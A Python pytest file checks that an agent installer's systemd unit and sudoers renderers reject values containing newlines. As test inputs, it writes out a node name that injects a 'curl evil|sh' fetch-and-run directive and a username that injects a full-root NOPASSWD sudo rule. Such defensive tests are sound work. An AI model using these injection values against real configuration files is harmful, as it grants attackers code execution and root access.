"""What the installer *writes* on a node, and why it may not be injectable.

A systemd unit and a sudoers file are line-oriented, so a newline inside an
interpolated value is not a formatting problem — it is a new directive, or a
new sudo rule, written by whoever supplied the value. Both renderers take
values that come from outside this process: a node name an operator typed, and
a username the remote machine's own ``whoami`` reported. Neither gets to be
trusted for where it came from.

Kept out of ``test_agent_bootstrap.py`` because that module marks every test
asyncio, and these are pure functions.
"""

from __future__ import annotations

import pytest


class TestRenderedFilesAreNotInjectable:
    """A systemd unit and a sudoers file are line-oriented.

    A newline inside an interpolated value is therefore not a formatting
    problem: it is a *new directive*, written by whoever supplied the value.
    Both renderers take values that come from outside this process — a node
    name an operator typed, and a username the remote machine's own ``whoami``
    reported — so both check rather than trust where the value came from.
    """

    def _paths(self):
        from spark_pulse.agent.bootstrap import InstallPaths

        return InstallPaths(
            scope="system",
            install_root="/opt/spark-pulse/agent",
            identity_dir="/var/lib/spark-pulse/agent",
            unit_dir="/etc/systemd/system",
            staging="/tmp/spark-pulse-bootstrap",
            systemctl="systemctl",
        )

    def test_a_node_name_cannot_add_a_unit_directive(self):
        from spark_pulse.agent.bootstrap import BootstrapError, render_unit

        with pytest.raises(BootstrapError, match="newline"):
            render_unit(
                self._paths(),
                "10.0.0.1:8110",
                node_name="spark\nExecStartPre=/bin/sh -c 'curl evil|sh'",
            )

    def test_an_ordinary_node_name_still_renders(self):
        from spark_pulse.agent.bootstrap import render_unit

        unit = render_unit(self._paths(), "10.0.0.1:8110", node_name="spark-02")

        assert "spark-02" in unit
        assert "ExecStart=/opt/spark-pulse/agent/current/bin/spark-pulse-agent" in unit

    def test_a_username_cannot_add_a_sudo_rule(self):
        from spark_pulse.agent.bootstrap import BootstrapError, render_sudoers

        with pytest.raises(BootstrapError, match="newline"):
            render_sudoers("spark\nspark ALL=(ALL) NOPASSWD: ALL")

    def test_an_ordinary_username_still_renders(self):
        from spark_pulse.agent.bootstrap import render_sudoers

        drop_in = render_sudoers("spark")

        assert drop_in.count("\n") == 3, "two comments and one rule"
        assert "spark ALL=(root) NOPASSWD:" in drop_in
